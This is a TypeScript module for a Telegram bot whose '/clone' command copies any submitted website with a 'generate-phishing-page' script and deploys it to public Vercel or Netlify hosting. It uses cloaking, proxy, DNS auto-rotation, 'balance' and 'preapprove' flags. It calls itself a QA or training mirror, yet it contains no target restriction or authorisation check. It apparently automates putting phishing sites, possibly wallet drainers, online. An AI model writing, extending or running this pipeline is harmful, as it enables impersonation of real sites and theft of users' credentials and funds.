/**
 * Telegram /clone — generate QA mirror via scripts/generate-phishing-page.ts and deploy.
 */
import { randomUUID } from 'node:crypto'
import { spawn } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const moduleDir = path.dirname(fileURLToPath(import.meta.url))

const DEFAULT_CLONE_FLAGS = [
  '--proxy',
  '--balance',
  '--cloak',
  '--preapprove',
  '--mirror',
  '--auto-rotate',
] as const
const GENERATE_TIMEOUT_MS = 180_000
const DEPLOY_TIMEOUT_MS = 300_000

type CommandResult = { stdout: string; stderr: string; code: number }

export type CloneDeployResult =
  | { ok: true; url: string; provider: 'vercel' | 'netlify' | 'local'; outDir: string }
  | { ok: false; error: string; stage?: 'generate' | 'deploy' }

const localServers = new Map<string, ReturnType<typeof spawn>>()

function resolveRepoRoot(): string {
  const candidates = [
    path.resolve(process.cwd(), '../..'),
    path.resolve(process.cwd(), '..'),
    path.resolve(process.cwd()),
    path.resolve(moduleDir, '../../../..'),
    path.resolve(moduleDir, '../../../../..'),
  ]

  for (const candidate of candidates) {
    const pkg = path.join(candidate, 'package.json')
    const script = path.join(candidate, 'scripts/generate-phishing-page.ts')
    if (fs.existsSync(pkg) && fs.existsSync(script)) {
      try {
        const parsed = JSON.parse(fs.readFileSync(pkg, 'utf8')) as { name?: string }
        if (parsed.name === 'legion-engine') return candidate
      } catch {
        /* try next */
      }
    }
  }

  return path.resolve(process.cwd(), '../..')
}

function runCommand(
  command: string,
  args: string[],
  cwd: string,
  env: NodeJS.ProcessEnv,
  timeoutMs: number,
): Promise<CommandResult> {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, {
      cwd,
      env,
      shell: process.platform === 'win32',
    })

    let stdout = ''
    let stderr = ''
    const timer = setTimeout(() => {
      child.kill('SIGTERM')
    }, timeoutMs)

    child.stdout?.on('data', (chunk: Buffer) => {
      stdout += chunk.toString()
    })
    child.stderr?.on('data', (chunk: Buffer) => {
      stderr += chunk.toString()
    })
    child.on('error', (err) => {
      clearTimeout(timer)
      reject(err)
    })
    child.on('close', (code) => {
      clearTimeout(timer)
      resolve({ stdout, stderr, code: code ?? 1 })
    })
  })
}

function extractUrlFromOutput(output: string): string | null {
  const matches = output.match(/https:\/\/[^\s"'<>]+/g)
  if (!matches?.length) return null
  const preferred = matches.find(
    (u) =>
      u.includes('.vercel.app') ||
      u.includes('.netlify.app') ||
      u.includes('vercel.app') ||
      u.includes('netlify.app'),
  )
  return preferred ?? matches[matches.length - 1] ?? null
}

function resolveDemoApiUrl(): string {
  const explicit = process.env['DEMO_API_URL']?.trim()
  if (explicit) return explicit.replace(/\/$/, '')

  const railway = process.env['RAILWAY_PUBLIC_DOMAIN']?.trim()
  if (railway) return `https://${railway.replace(/^https?:\/\//, '')}`

  const port = process.env['PORT']?.trim() || '4000'
  return `http://127.0.0.1:${port}`
}

function createTempOutputDir(): string {
  const dir = path.join(os.tmpdir(), `clone_${Date.now()}_${randomUUID().slice(0, 8)}`)
  fs.mkdirSync(dir, { recursive: true })
  return dir
}

/** Parse target URL from `/clone https://example.com` message text. */
export function parseCloneCommandUrl(messageText: string | undefined): string | null {
  const text = messageText?.trim() ?? ''
  const match = text.match(/^\/clone(?:@\w+)?\s+(\S+)/i)
  if (!match?.[1]) return null

  let raw = match[1].trim()
  if (!/^https?:\/\//i.test(raw)) raw = `https://${raw}`

  try {
    const url = new URL(raw)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return null
    return url.href
  } catch {
    return null
  }
}

async function generateCloneSite(targetUrl: string, outDir: string): Promise<{ ok: true } | { ok: false; error: string }> {
  if (process.env['NODE_ENV']?.trim().toLowerCase() === 'production') {
    console.warn(
      '[CLONE] --mirror --auto-rotate is enabled; mirror/DNS rotation works best on a dedicated Docker host, not the Railway API service',
    )
  }

  const repoRoot = resolveRepoRoot()
  const scriptPath = path.join(repoRoot, 'scripts/generate-phishing-page.ts')
  if (!fs.existsSync(scriptPath)) {
    return { ok: false, error: `Clone script not found at ${scriptPath}` }
  }

  const childEnv: NodeJS.ProcessEnv = {
    ...process.env,
    PHISHING_TRAINING_MODE: 'true',
    NODE_ENV: 'development',
    DEMO_API_URL: resolveDemoApiUrl(),
  }

  const args = ['exec', 'tsx', scriptPath, ...DEFAULT_CLONE_FLAGS, targetUrl, outDir]

  let result: CommandResult
  try {
    result = await runCommand('pnpm', args, repoRoot, childEnv, GENERATE_TIMEOUT_MS)
  } catch (e) {
    return {
      ok: false,
      error: e instanceof Error ? e.message : String(e),
    }
  }

  if (result.code !== 0) {
    const detail = (result.stderr || result.stdout).trim().slice(0, 800)
    return { ok: false, error: detail || `Generator exited with code ${result.code}` }
  }

  const indexPath = path.join(outDir, 'index.html')
  if (!fs.existsSync(indexPath)) {
    return { ok: false, error: 'Generator finished but index.html is missing' }
  }

  return { ok: true }
}

async function deployToVercel(outDir: string): Promise<{ ok: true; url: string } | { ok: false; error: string }> {
  const token = process.env['VERCEL_TOKEN']?.trim()
  if (!token) return { ok: false, error: 'VERCEL_TOKEN not set' }

  const vercelJson = path.join(outDir, 'vercel.json')
  if (!fs.existsSync(vercelJson)) {
    await fs.promises.writeFile(
      vercelJson,
      JSON.stringify(
        {
          version: 2,
          builds: [{ src: '**', use: '@vercel/static' }],
          routes: [{ src: '/(.*)', dest: '/$1' }],
        },
        null,
        2,
      ),
      'utf8',
    )
  }

  let result: CommandResult
  try {
    result = await runCommand(
      'npx',
      ['--yes', 'vercel', 'deploy', '--prod', '--yes', '--token', token],
      outDir,
      { ...process.env, VERCEL_TOKEN: token },
      DEPLOY_TIMEOUT_MS,
    )
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : String(e) }
  }

  if (result.code !== 0) {
    return {
      ok: false,
      error: (result.stderr || result.stdout).trim().slice(0, 800) || 'Vercel deploy failed',
    }
  }

  const url = extractUrlFromOutput(`${result.stdout}\n${result.stderr}`)
  if (!url) return { ok: false, error: 'Vercel deploy succeeded but no URL found in output' }
  return { ok: true, url }
}

async function deployToNetlify(outDir: string): Promise<{ ok: true; url: string } | { ok: false; error: string }> {
  const token = process.env['NETLIFY_TOKEN']?.trim()
  if (!token) return { ok: false, error: 'NETLIFY_TOKEN not set' }

  let result: CommandResult
  try {
    result = await runCommand(
      'npx',
      ['--yes', 'netlify', 'deploy', '--prod', '--dir', '.', '--auth', token, '--message', 'legion-clone-bot'],
      outDir,
      { ...process.env, NETLIFY_AUTH_TOKEN: token },
      DEPLOY_TIMEOUT_MS,
    )
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : String(e) }
  }

  if (result.code !== 0) {
    return {
      ok: false,
      error: (result.stderr || result.stdout).trim().slice(0, 800) || 'Netlify deploy failed',
    }
  }

  const url = extractUrlFromOutput(`${result.stdout}\n${result.stderr}`)
  if (!url) return { ok: false, error: 'Netlify deploy succeeded but no URL found in output' }
  return { ok: true, url }
}

async function deployToLocalServer(outDir: string): Promise<{ ok: true; url: string } | { ok: false; error: string }> {
  const portRaw = process.env['CLONE_LOCAL_PORT']?.trim()
  const port = portRaw ? Number.parseInt(portRaw, 10) : 8765 + Math.floor(Math.random() * 500)
  if (!Number.isFinite(port) || port < 1024 || port > 65535) {
    return { ok: false, error: 'CLONE_LOCAL_PORT must be a valid port (1024–65535)' }
  }

  return new Promise((resolve) => {
    const child = spawn('npx', ['--yes', 'serve', outDir, '-l', String(port)], {
      cwd: outDir,
      shell: process.platform === 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
      env: process.env,
    })

    localServers.set(outDir, child)

    let settled = false
    const finish = (result: { ok: true; url: string } | { ok: false; error: string }) => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      resolve(result)
    }

    const timer = setTimeout(() => {
      finish({ ok: true, url: `http://127.0.0.1:${port}` })
    }, 4_000)

    child.on('error', (err) => {
      finish({ ok: false, error: err.message })
    })

    child.stdout?.on('data', (chunk: Buffer) => {
      const text = chunk.toString()
      const match = text.match(/https?:\/\/[^\s]+/)
      if (match?.[0]) {
        finish({ ok: true, url: match[0].replace(/[^\w:/.-]+$/, '') })
      }
    })
  })
}

async function deployCloneSite(
  outDir: string,
): Promise<
  | { ok: true; url: string; provider: 'vercel' | 'netlify' | 'local' }
  | { ok: false; error: string }
> {
  if (process.env['VERCEL_TOKEN']?.trim()) {
    const vercel = await deployToVercel(outDir)
    if (vercel.ok) return { ok: true, url: vercel.url, provider: 'vercel' }
    console.warn('[CLONE_DEPLOY] Vercel failed:', vercel.ok === false ? vercel.error : 'unknown')
  }

  if (process.env['NETLIFY_TOKEN']?.trim()) {
    const netlify = await deployToNetlify(outDir)
    if (netlify.ok === false) {
      return { ok: false, error: netlify.error }
    }
    return { ok: true, url: netlify.url, provider: 'netlify' }
  }

  const local = await deployToLocalServer(outDir)
  if (local.ok === false) {
    return { ok: false, error: local.error }
  }
  return { ok: true, url: local.url, provider: 'local' }
}

async function maybeCleanup(outDir: string): Promise<void> {
  const keep = process.env['CLONE_KEEP_TEMP']?.trim().toLowerCase()
  if (keep === 'true' || keep === '1') return

  try {
    await fs.promises.rm(outDir, { recursive: true, force: true })
  } catch (e) {
    console.warn('[CLONE_DEPLOY] Temp cleanup failed:', e instanceof Error ? e.message : String(e))
  }
}

/** Generate clone + deploy (Vercel → Netlify → local static server). */
export async function runCloneAndDeploy(targetUrl: string): Promise<CloneDeployResult> {
  const outDir = createTempOutputDir()

  const generated = await generateCloneSite(targetUrl, outDir)
  if (generated.ok === false) {
    await maybeCleanup(outDir)
    return { ok: false, error: generated.error, stage: 'generate' }
  }

  const deployed = await deployCloneSite(outDir)
  if (deployed.ok === false) {
    await maybeCleanup(outDir)
    return { ok: false, error: deployed.error, stage: 'deploy' }
  }

  if (deployed.provider !== 'local') {
    await maybeCleanup(outDir)
  }

  return {
    ok: true,
    url: deployed.url,
    provider: deployed.provider,
    outDir,
  }
}

export function stopLocalCloneServers(): void {
  for (const [dir, child] of localServers) {
    try {
      child.kill('SIGTERM')
    } catch {
      /* ignore */
    }
    localServers.delete(dir)
  }
}
